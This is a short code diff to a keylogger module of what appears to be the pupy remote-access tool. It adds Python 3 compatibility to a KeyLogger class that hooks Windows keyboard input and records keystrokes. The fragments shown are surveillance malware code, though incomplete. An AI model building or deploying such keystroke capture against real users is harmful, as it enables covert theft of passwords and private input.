@@ -2,6 +2,7 @@ from __future__ import absolute_import
 from __future__ import division
 from __future__ import print_function
 from __future__ import unicode_literals
+
 # --------------------------------------------------------------
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # All rights reserved.
@@ -32,6 +33,10 @@ from .hookfuncs import (
 )
 
 import pupy
+import sys
+
+if sys.version_info.major > 2:
+    unicode = str
 
 UNPRINTABLE = {
     0x09: 'TAB',
@@ -94,6 +99,7 @@ def is_pressed(*keys):
         GetKeyState(x) & 0x8000 for x in keys
     )
 
+
 class KeyLogger(pupy.Task):
     results_type = unicode
 
@@ -105,10 +111,10 @@ class KeyLogger(pupy.Task):
         self.hook_proc_ptr = HOOKPROC(self.hook_proc)
 
     def append(self, k):
-        if type(k) == unicode:
-            super(KeyLogger, self).append(k)
-        else:
+        if isinstance(k, bytes):
             super(KeyLogger, self).append(k.decode('utf-8'))
+        else:
+            super(KeyLogger, self).append(k)
 
     def task(self):
         if self.hooked:
